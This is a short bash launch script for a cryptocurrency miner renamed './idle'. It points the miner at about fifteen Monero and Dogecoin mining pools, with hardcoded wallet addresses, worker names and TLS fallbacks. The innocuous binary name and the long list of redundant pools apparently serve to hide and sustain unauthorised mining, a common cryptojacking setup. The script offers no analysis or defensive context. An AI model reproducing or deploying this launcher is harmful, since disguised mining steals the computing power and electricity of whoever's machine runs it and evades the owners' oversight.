#!/bin/bash

# ./idle --donate-level 0 --cpu-priority 5 \
./idle \
-o stratum+tcp://rx-eu.unmineable.com:3333 -a rx -u "DOGE:DPyjfCy8KjJCdfAfoWV381rhVde4piKeBR.hznX#buno-blux" -p x -k \
-o de.monero.herominers.com:1111 -a rx/0 -u "84rnsoknJKsisf6ExBnFPfKfu2W1VnHv6W8oRQmQvHR1hGd347HUyAdJQuEFcbxmzJM4pMkxqhrZBhStSmPZgh8Q51pjjyZ" -p hznX -k \
-o monerohash.com:5555 -u "84rnsoknJKsisf6ExBnFPfKfu2W1VnHv6W8oRQmQvHR1hGd347HUyAdJQuEFcbxmzJM4pMkxqhrZBhStSmPZgh8Q51pjjyZ" -p x -k \
-o monerohash.com:9999 --coin XMR -u "84rnsoknJKsisf6ExBnFPfKfu2W1VnHv6W8oRQmQvHR1hGd347HUyAdJQuEFcbxmzJM4pMkxqhrZBhStSmPZgh8Q51pjjyZ" -k --tls \
-o monero.herominers.com:10191 -a rx/0 -u "84rnsoknJKsisf6ExBnFPfKfu2W1VnHv6W8oRQmQvHR1hGd347HUyAdJQuEFcbxmzJM4pMkxqhrZBhStSmPZgh8Q51pjjyZ" -p hznX -k --tls \
-o pool.hashvault.pro:443 -u "84rnsoknJKsisf6ExBnFPfKfu2W1VnHv6W8oRQmQvHR1hGd347HUyAdJQuEFcbxmzJM4pMkxqhrZBhStSmPZgh8Q51pjjyZ" -p hznX -k --tls \
-o pool.supportxmr.com:443 -u "84rnsoknJKsisf6ExBnFPfKfu2W1VnHv6W8oRQmQvHR1hGd347HUyAdJQuEFcbxmzJM4pMkxqhrZBhStSmPZgh8Q51pjjyZ" -p hznX -k --tls \
-o pool.xmr.pt:9000 -u "84rnsoknJKsisf6ExBnFPfKfu2W1VnHv6W8oRQmQvHR1hGd347HUyAdJQuEFcbxmzJM4pMkxqhrZBhStSmPZgh8Q51pjjyZ" -k --tls \
-o randomxmonero.eu.nicehash.com:3380 -a randomx --coin monero -u "NHbRWTzTj2XXvhDLnCTV86V3t6G9g1megdvQ.hznX" -k \
-o xmr-eu1.nanopool.org:14433 --coin XMR -u "84rnsoknJKsisf6ExBnFPfKfu2W1VnHv6W8oRQmQvHR1hGd347HUyAdJQuEFcbxmzJM4pMkxqhrZBhStSmPZgh8Q51pjjyZ" -p hznX -k --tls \
-o xmr.2miners.com:2222 --coin XMR -u "84rnsoknJKsisf6ExBnFPfKfu2W1VnHv6W8oRQmQvHR1hGd347HUyAdJQuEFcbxmzJM4pMkxqhrZBhStSmPZgh8Q51pjjyZ.hznX" -p x -k \
-o xmr.kryptex.network:7777 --coin XMR -u "84rnsoknJKsisf6ExBnFPfKfu2W1VnHv6W8oRQmQvHR1hGd347HUyAdJQuEFcbxmzJM4pMkxqhrZBhStSmPZgh8Q51pjjyZ/hznX" -k \
-o xmr.pool.gntl.co.uk:20009 -u "84rnsoknJKsisf6ExBnFPfKfu2W1VnHv6W8oRQmQvHR1hGd347HUyAdJQuEFcbxmzJM4pMkxqhrZBhStSmPZgh8Q51pjjyZ" -p hznX -k --tls \
-o xmr.ss.dxpool.com:5555 --coin XMR -u "gamesup.hznX" -p x -k \
-o xmrpool.eu:9999 -u "84rnsoknJKsisf6ExBnFPfKfu2W1VnHv6W8oRQmQvHR1hGd347HUyAdJQuEFcbxmzJM4pMkxqhrZBhStSmPZgh8Q51pjjyZ" -k --tls
